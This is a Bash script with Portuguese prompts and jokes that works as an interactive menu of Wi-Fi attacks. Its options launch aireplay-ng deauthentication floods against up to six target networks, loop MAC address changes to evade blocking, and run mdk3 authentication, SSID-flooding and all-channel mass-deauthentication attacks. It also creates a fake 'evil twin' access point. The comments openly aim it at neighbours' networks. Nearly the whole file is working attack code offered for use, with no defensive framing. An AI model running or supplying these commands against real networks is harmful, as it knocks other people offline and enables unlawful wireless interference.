#!/bin/bash

airmon-ng check kill

clear

echo "Bom Esse Script e Zica!!!(eu acho kkk HUMOR)"

echo ""

iwconfig

echo "Digite a Interface Para Colocar em Modo Monitor"

read WIRELLES

ifconfig $WIRELLES down

iwconfig $WIRELLES mode monitor

sleep 2

macchanger -r $WIRELLES

echo ""

while true

do

clear

echo "*********************************************************"

echo "*******************Selecione a Opção*********************"

echo "*********************************************************"

echo "**                                                 ******"

echo "** 1. Ataca uma Rede                                  ***"

echo "** 2. Ataca duas Redes                                ***"

echo "** 3. Ataca Uma Rede (Macchanger)                     ***"

echo "** 4. Ataca Com Mdk3,Aireplay-ng,Macchanger           ***"

echo "** 5. Isso e a Zuera Criar Uma Rede Com Airbase-ng    ***"

echo "** 6. Essa Zuera e Com Mdk3 (Inundação SSID)          ***"

echo "** 7. Desaltenticação em Massa Derruba Ate a Sua Rede ***"

echo "** 8. Ataca 6 Redes (Aireplay-ng) Esse e Bravo        ***"

echo "** 9. Reinicia Sua Placa(Normal)                      ***"

echo "**                                                    ***"

echo "*********************************************************"

echo "**********Criado por el Fodon kkkk(humor)****************"

echo "*********************************************************"

echo ""

read n

case $n in

1)clear

airodump-ng $WIRELLES --wps

echo "Informe o BSSID da Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Informe o CANAL da Rede Alvo:"

read CANAL

[[ $CANAL == "" ]]

echo "Informe o ESSID da Rede Alvo:"

read ESSID

[[ $ESSID == "" ]]

echo "Vamos Fixar o Canal na Interface"

clear

echo "Aguarde ..."

(xterm -title "$ESSID" -e airodump-ng $WIRELLES --bssid $BSSID --channel $CANAL)

clear

echo "Otimo Agora o Ataque Começa Aperte Crtl+c Pra Para o Ataque"

read -p "Precione Qualquer Tecla Para Iniciar o Ataque"

(xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES);;

2)clear

airodump-ng $WIRELLES --wps

echo "As Redes Alvos São Do Mesmo Canal y/n:"

read y

if [[ $y == "y" ]];then

echo "Otimo!"

echo "Informe o BSSID da 1 Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Informe o CANAL das Rede Alvo:"

read CANAL

[[ $CANAL == "" ]]

echo "Informe o ESSID da 1 Rede Alvo:"

read ESSID

[[ $ESSID == "" ]]

echo ""

echo "Informe o BSSID da 2 Rede Alvo:"

read DBSSID

[[ $DBSSID == "" ]]

echo "Informe o ESSID da 2 Rede Alvo:"

read DESSID

[[ $DESSID == "" ]]

echo "Vamos Fixar o Canal na Interface"

echo ""

(xterm -e airodump-ng $WIRELLES --channel $CANAL --wps)&

sleep 3

killall airodump-ng

(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES) &

sleep 2

(xterm -title "$DESSID" -e aireplay-ng -0 0 -a $DBSSID $WIRELLES) &

clear

else

echo "Informe o BSSID da 1 Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Informe o CANAL da 1 Rede:"

read CANAL

[[ $CANAL == "" ]]

echo "Informe o ESSID da 1 Rede:"

read ESSID

[[ $ESSID == "" ]]

echo "Informe o BSSID da 2 Rede Alvo:"

read DBSSID

[[ $DBSSID == "" ]]

echo "Informe o CANAL da 2 Rede:"

read OCANAL

[[ $OCANAL == "" ]]

echo "Informe o ESSID da 2 Rede Alvo:"

read BESSID

[[ $BESSID == "" ]]

echo ""

echo "Vamos Fixar a 1 Rede e Atacar:"

(xterm -e airodump-ng $WIRELLES --channel $CANAL --bssid $BSSID)&

sleep 2

(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES -e $ESSID ) &

killall airodump-ng

sleep 1

echo "Agora Vamos Pra 2 Rede:"

sleep 2

(xterm -e airodump-ng $WIRELLES --channel $OCANAL --bssid $DBSSID ) &

sleep 3

(xterm -title "$BESSID" -e aireplay-ng -0 0 -a $DBSSID $WIRELLES ) &

killall airodump-ng

echo ""

echo "Para Finalizar Aperte Ctrl+C"

fi ;;

3)clear

echo "Oh Voce por Aqui Vamos Lá Então"

echo ""

echo "Bom Vamos Fazer Algo Mais Profundo hahah (HUMOR)"

echo "Esse Vai ser um Ataque Igual so Que com o Macchanger"

read -p "Aperte para Continuar"

airodump-ng $WIRELLES --wps

echo "Informe o BSSID da Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Informe o CANAL das Rede Alvo:"

read CANAL

[[ $CANAL == "" ]]

echo "Informe o ESSID da Rede Alvo:"

read ESSID

[[ $ESSID == "" ]]

echo "Informe o Numero de PACOTES a ser Enviado:"

read PACOTES

[[ $PACOTES == "" ]]

echo ""

echo "Agora Vamos Ver a parte Avançada:"

echo "Vamos Utizar o Macchanger com Repetição"

echo ""

echo "Vamos Fixar o Canal Na Placa . . ."

read -p "Aperta ai denovo"

(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES ) &

sleep 2

clear

echo "Ta Quase Acabando !!!"

killall airodump-ng

for i in {1..5000}

do

aireplay-ng -0 $PACOTES -a $BSSID $WIRELLES

sleep 3

ifconfig $WIRELLES down

sleep 2

macchanger -r $WIRELLES

sleep 2

(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES ) &

sleep 3

killall airodump-ng

done ;;

4)clear

echo "AHRAM!!! Bom Vamos ao Ataque Vamos Acabar Com Vizinhos "

echo "It's My Life Man haha (HUMOR KKK)"

read -p "Aperte ai Pra Seguir kkk"

echo "Bom Vamos Lá:"

airodump-ng $WIRELLES

echo ""

echo "Informe o BSSID da Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Informe o CANAL da Rede Alvo:"

read CANAL

[[ $CANAL == "" ]]

echo "Informe o ESSID da Rede Alvo:"

read ESSID

[[ $ESSID == "" ]]

clear

echo "Vamos Fixar o Channel (Ingles Ne kkk HUMOR)"

echo "Mas Antes Vamos Mudar o MAC da Placa :"

ifconfig $WIRELLES down

sleep 2

macchanger -r $WIRELLES

sleep 1

iwconfig $WIRELLES mode monitor

sleep 2

echo "Bom Agora Sim Mac Mudado,Agora o Pau Come !!!"

sleep 1

(xterm -title "$ESSID" -e airodump-ng --bssid $BSSID --channel $CANAL --wps $WIRELLES) &

sleep 3

killall airodump-ng

echo "Agora a Porra Fica Seria haha"

echo ""

sleep 2

(xterm -title "$ESSID" -e aireplay-ng -0 0 -a $BSSID $WIRELLES) &

sleep 2

(xterm -title "Agora o Mdk3 Vai Comer Solto haha !!!" -e mdk3 $WIRELLES a -i $BSSID -s 1000) &

sleep 2

echo "Bom Isso e Tudo Pessoal !!!" ;;

5)clear

echo "Bom Vamos a Zuera Isso"

echo "O Bom e Quer Voce Pode Fazer o Irmão Gemeo Do Mal"

echo "Vamos lá"

echo "Escreva o Nome Para Sua Rede Fake:"

read NOME_DA_REDE

[[ $NOME_DA_REDE == "" ]]

echo ""

echo "Selecione um Canal Para a Rede:"

read CANAL

[[ $CANAL == "" ]]

clear

echo "OK!!! O Nome Da Rede Sera $NOME_DA_REDE Que Zueiro hahaha (HUMOR)"

echo ""

read -p "Aperta o ENTER . . ."

echo ""

(xterm -title "Rede Fake Da Zueira" -e airbase-ng $WIRELLES --essid "$NOME_DA_REDE" -c $CANAL ) &

sleep 3

echo ""

echo "Bom Isso e Tudo Pessoal"

echo "Mas Pra Frente Eu to Uma Atualizada Nele !!!"

;;

6)clear

echo "Bom o Metodo Foi Mdk3 haha "

echo "Vamos aos Seguintes Requistos Nessecidades:"

echo " 1 Wordlist Com SSIDS (Facil)"

echo "Voce Tem Uma Wordlist S/N:"

read S

if [[ $S == "S" ]];then

echo "Informe o Caminho Da Sua Wordlist:"

read CAMINHO

[[ $CAMINHO == "" ]]

(xterm -title "Redes Fakes" -e mdk3 $WIRELLES b -f $CAMINHO -s 10000 -c 1,2,3,4,5,6,7,8,9,10,11,12 ) &

sleep 2

else

[[ $N == "N" ]]

echo ""

echo "Bom Voce Não Tem Uma Wordlist Vamos Então Criar as Redes:"

echo ""

sleep 2

(xterm -title "Rede Fake" -e mdk3 $WIRELLES b -f- -s 10000 -c 1,2,3,4,5,6,7,8,9,10,11,12 ) &

sleep 3

fi ;;

7)clear

echo "Bom esse o Brabo Quando Esse e Ativado . . ."

echo "Man o Mostro Vai Sair da Jaula Ferrormente kkkk(HUMOR)"

read -p "So Aperte se Tem Certeza Disso"

echo "Seloco Muleke e Brabo Mesmo!!!"

ifconfig $WIRELLES | awk '/HWaddr/ {print $5}' > /tmp/deauth-whitelist.txt

(xterm -title "O MOSTRO SAI DA JAULA" -e mdk3 $WIRELLES d -w /tmp/deauth-whitelist.txt -c 1,2,3,4,5,6,8,9,10,11) &

;;

8)clear

echo "Bom Esse Ataca Seis Redes e Isso Ai"

read -p "Aperta ai e a Magica Acontece !!!"

sleep 1

airodump-ng $WIRELLES --wps

echo "Digite o BSSID Da 1 Rede Alvo:"

read BSSID

[[ $BSSID == "" ]]

echo "Digite o CANAL Da 1 Rede Alvo:"

read CANAL

[[ $CANAL == "" ]]

echo "Digite o BSSID Da 2 Rede Alvo:"

read ABSSID

[[ $ABSSID == "" ]]

echo "Digite o CANAL Da 2 Rede Alvo:"

read ACANAL

[[ $ACANAL == "" ]]

echo "Digite o BSSID Da 3 Rede Alvo:"

read ZBSSID

[[ $ZBSSID == "" ]]

echo "Digite o CANAL Da 3 Rede Alvo:"

read ZCANAL

[[ $ZCANAL == "" ]]

echo "Digite o BSSID Da 4 Rede Alvo:"

read XBSSID

[[ $XBSSID == "" ]]

echo "Digite o CANAL Da 4 Rede Alvo:"

read XCANAL

[[ $XCANAL == "" ]]

echo "Digite o BSSID Da 5 Rede Alvo:"

read HBSSID

[[ $HBSSID == "" ]]

echo "Digite o CANAL Da 5 Rede Alvo:"

read HCANAL

[[ $HCANAL == "" ]]

echo "Digite o BSSID Da 6 Rede Alvo:"

read RBSSID

[[ $RBSSID == "" ]]

echo "Digite o CANAL Da 6 Rede Alvo:"

read RCANAL

[[ $RCANAL == "" ]]

clear

sleep 2

echo "Vamos Fixar Cada Canal e Começar o Ataque:"

read -p "Aperte Para Iniciar."

(xterm -e airodump-ng --bssid $BSSID --channel $CANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $BSSID $WIRELLES ) &

killall airodump-ng

sleep 1

(xterm -e airodump-ng --bssid $ABSSID --channel $ACANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $ABSSID $WIRELLES) &

killall airodump-ng

sleep 1

(xterm -e airodump-ng --bssid $ZBSSID --channel $ZCANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $ZBSSID $WIRELLES) &

sleep 1

killall airodump-ng

sleep 1

(xterm -e airodump-ng --bssid $XBSSID --channel $XCANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $XBSSID $WIRELLES) &

sleep 1

killall airodump-ng

sleep 1

(xterm -e airodump-ng --bssid $HBSSID --channel $HCANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $HBSSID $WIRELLES) &

sleep 1

killall airodump-ng

sleep 1

(xterm -e airodump-ng --bssid $RBSSID --channel $RCANAL $WIRELLES --wps) &

sleep 1

(xterm -e aireplay-ng -0 0 -a $RBSSID $WIRELLES) &

sleep 1

killall airodump-ng

sleep 3

;;

9)clear

echo "Deseja Voltar Sua Placa ao Modo Manager(Normal)y/n:"

read y

if [[ $y == "y" ]];then

echo "OK! Iniciando Placa-Network (Porque Nois No Ingles e Zica) . . ."

service network-manager restart

echo "Pronto Negada Ta Sussa Denovo kkk(HUMOR)"

echo""

else

echo "Então complicou ai kkkk (HUMOR,TROLLEI):"

echo "Reinicia ai Então"



fi ;;

esac

done

